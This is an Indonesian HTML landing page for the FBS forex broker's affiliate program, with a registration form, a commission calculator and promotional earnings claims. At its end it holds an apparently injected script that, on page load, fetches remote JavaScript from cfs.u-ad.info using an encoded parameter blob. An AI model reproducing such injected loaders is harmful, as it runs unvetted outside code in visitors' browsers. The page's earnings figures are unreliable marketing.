<!DOCTYPE html>
<html>
<head>
	<meta content="IE=EmulateIE9,IE=edge" http-equiv="X-UA-Compatible" />
	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
	<title>Program kemitraan FBS baru yang revolusioner</title>
	<meta name="title" content="Program kemitraan FBS baru yang revolusioner" />
	<meta name="keywords" content="Program kemitraan FBS baru yang revolusioner" />
	<meta name="description" content="Program kemitraan FBS baru yang revolusioner" />
	<link href="assets/bootstrap-3.3.5-dist/css/bootstrap.min.css" rel="stylesheet">
	<link rel="stylesheet" type="text/css" href="css/style.css">
	<link rel="stylesheet" href="http://landing.idnfbs.com/ru/partner-new/style.css" type="text/css" media="screen, projection" />

	
	<link href='http://fonts.googleapis.com/css?family=Open+Sans:400,800,700,600&subset=latin,vietnamese,latin-ext,cyrillic' rel='stylesheet' type='text/css'>
	
	<link rel="stylesheet" href="http://landing.idnfbs.com/ru/partner-new/js/jquery.ui.slider.css">
	<script src="http://landing.idnfbs.com/ru/partner-new/js/jquery-1.9.1.js"></script>
	<script src="http://landing.idnfbs.com/ru/partner-new/js/jquery.ui.core.js"></script>
	<script src="http://landing.idnfbs.com/ru/partner-new/js/jquery.ui.widget.js"></script>
	<script src="http://landing.idnfbs.com/ru/partner-new/js/jquery.ui.mouse.js"></script>
	<script src="http://landing.idnfbs.com/ru/partner-new/js/jquery.ui.slider.js"></script>
	
	<script>
	var __formatSumm = function(sum)
	{
		var c = sum.length, s = sum, m = "", i = 0; 
		while(c--){if(i==3){m+=' '+s[c];i=0;}else{m += s[c];}i++;}	
		return m.split("").reverse().join("");
	}

	$(function() {
		$summa1 = 10;
		$summa2 = 1;
		
		$( "#slider" ).slider({
			value:10,
			min: 10,
			max: 999,
			step: 1,
			slide: function( event, ui ) {//ui.value

				$summa1 = ui.value + "";
				
				var c_right = ui.value + "";
				$( "#slider .right-b" ).html(__formatSumm(c_right));
				
				var proc = $("#slider .ui-slider-handle").attr('style');
				$("#slider .count").attr('style',proc);
				
				var summa_end = $summa1*$summa2*20 + "";
				$('#summa').html(__formatSumm(summa_end)+"$");
			}
			});
		
			$( "#slider2" ).slider({
			value:0.5,
			min: 1,
			max: 50,
			step: 1,
			slide: function( event, ui ) {//ui.value

				$summa2 = ui.value + "";
							
				var c_right = ui.value + "";
				$( "#slider2 .right-b" ).html(__formatSumm(c_right));
				
				var proc = $("#slider2 .ui-slider-handle").attr('style');
				$("#slider2 .count").attr('style',proc);
				
				var summa_end = $summa1*$summa2*20 + "";
				$('#summa').html(__formatSumm(summa_end)+"$");
			}
			});
	});
	</script>
	<link rel="shortcut icon" type="image/x-icon" href="http://landing.idnfbs.com/en/5bonus/images/favicon.ico" />
<meta property="og:type" content="website">
<meta property="og:title" content=""/>
<meta property="og:image" content="http://landing.idnfbs.com/en/5bonus/images/logo_300x300.png">
<meta property="og:image:type" content="image/png">
</head>
<body class="background-body">
<div class="padding-form-register">
		<form class="form form-daftar" method="get" action="https://my.idnfbs.com/registration">
			<center>
			<img src="images/logo.jpg" class="img-responsive" alt="Image">
			</center>
			<div class="t2 font-account">
				Buka Account
			</div>
				<div class="text_count_small mt_10 tc_gr1">Member baru bisa request $5.<br/> Tanpa perlu deposit.</div>
			
			<div class="inp">
				<input type="hidden" value="micro" name="account">
					<input type="hidden" value="id" name="lang">
					<input type="hidden" value="450471" name="ppu">
					
					<input placeholder="Nama lengkap" type="text" name="name"/>
					<input placeholder="E-mail Anda" type="text" name="email"/>
			</div>

			<div class="subm">
				<input type="submit" class="" value="" />
				<span>Buka akun</span>
			</div>
			<div class="t-bot"><a href="http://my.idnfbs.com">Saya sudah memiliki akun di FBS</a></div>
		</form>
</div>
<div class="logo_place">
		<div class="text-count">Lebih dari 130 000 mitra di seluruh dunia<br/></div>
		<div class="text-count mt_5"><b>Program kemitraan FBS baru yang revolusioner</b></div>
		<div class="text_lot1 ml_20">15$ per 1 lot untuk EUR/USD <sup class="fs_12px">dan lebih banyak!</sup></div>

		<div class="text_count_big1 mt_20 line-height">berlaku hingga akhir 2015</div>

</div>
<div class="tes">
<div class="container background-div">
<div class="col-xs-12 col-sm-12 col-md-7 col-lg-7 col-nul tengah">
		<div class="calc1 tengah">
			<div class="head_calc">Hitung profit Anda</div>
			<div id="slider" class="img-responsive">
				<div class="left-min">10</div>
				<div class="right-max">999</div>
				<div class="count">
					<div class="r-t">Jumlah klien <br />yang ditarik</div>
					<div class="right-b">10</div>
				</div>
			</div>
			<div id="slider2" class="img-responsive">
				<div class="left-min">1</div>
				<div class="right-max">50</div>
				<div class="count">
					<div class="r-t">Jumlah order dari <br/>1 klien per hari</div>
					<div class="right-b">1</div>
				</div>
			</div>
			
			<div class="text_count_big_l mt_40">Hasil bulanan Anda: <div class="summa" id="summa">200$</div></div>
		</div>	
</div>
<div class="col-xs-12 col-sm-12 col-md-5 col-lg-5 ">
	<div class="middle tengah">
	<b class="salad">Kami mematahkan stereotype kemitraan</b><br/><br>
	- Pembayaran komisi kepada setiap klien seumur hidup<br/>
	- Penarikan dana setiap hari mulai dari $1 melalui pilihan pembayaran apapun<br/>
	- Statistik rinci secara online<br/>
	</div>
	<div class="middle tengah">
	<b class="salad">Kami menggandakan kesempatan Anda:</b><br/><br>
	- Materi promosi gratis untuk menarik lebih banyak klien<br/>
	- Personal manager untuk menyelesaikan semua masalah secara cepat<br/>
	- Hadiah-hadiah bergengsi dan kontes dengan hadiah-hadiah yang berharga<br/>
	</div>
</div>
</div>
</div>
<div class="col-xs-12 col-sm-12 col-md-12 col-lg-12 col-nul">
<div class="background-footer">
<div class="container">
<div class="content_place1">
	<div class="text_count_big2 content_place1  ">Sementara Anda membaca halaman ini FBS membayarkan kepada partnernya sekitar 200 000$!</div>
	<center>
		<b class="salad">Penghargaan kami</b><br/>
	</center>
	<a href="http://www.idnfbs.com/id/awards">
	<img src="images/nagr.png" class="img-responsive tengah" alt="Image">
	</a>
</div>
<div class="text_count_small mt_10 mb_40 tc_gr1"><a href="http://www.fbs.market/">www.fbs.com</a><br />
	<a href="http://www.fbs.com/sites/default/files/doc/fbs_privacy_policy.pdf" target="_blank">Privacy Policy</a>
</div>
</div>
</div>
</div>

	<div style="height:0; overflow:hidden;">
	</div>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582AaN6h071sG%2b6%2fxx8hoyOrOr04AtmvUsRnXipmLZaXh1hdtqrwmTZp5rGkjzPuYKtZYNCgD%2bVCGBJH8nHjN7yohLliOn%2fd%2b7twuCQBQExrenlfUP3arbH4%2ftEC7WwWU4%2f8CPGKBuWhoglpJAsgGeGElAWERyeNgtuntg7HLVpPzEtb3NLql06SOw8wAQULSJhnYfyJXSRKtMC9K82U89DVJuu4t09d3%2fiQty9uHFykWKz8UN4vvPzHYmBluafyQ2Js6KE66MWOpOLnNnekhKOF4F60FOPauyv1%2bsuRob4ivMvz4wiWk7%2fhKPyuK28hxropqzW9dsiknwA78ygiJOcTatPn6i7rhbivOn9JgUAXnykHDNkZ8xTccOdLRu15Rlg2U0wIiRuOxohiBOdKuxGoJ8%2b2DX%2bk8HHaorZKtjwwBZaCEyTN5i2HWZ%2b%2bc6gRx6X0Ib1gAMdCWIr%2f2R4dgDbnZHmvaSdISYx0K3l0nIo1hrXmYh2kHBQDSgkDKpdh1YxYeJq5zISLUitBGGtkImAt8Kkhw31EgGeLLMfAtYrgmLZbU1Y4XY5DWa9JBFhfPK74%2fr0it3aQBcmhTxiPLB4J3h1BuaxI1IMjr1GO9kz0okxyxl525lDjMUObIebOjQjbOaTZdHiJ5x" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};
</script>
<script src="assets/bootstrap-3.3.5-dist/js/bootstrap.min.js"></script>
		
</body>
</html>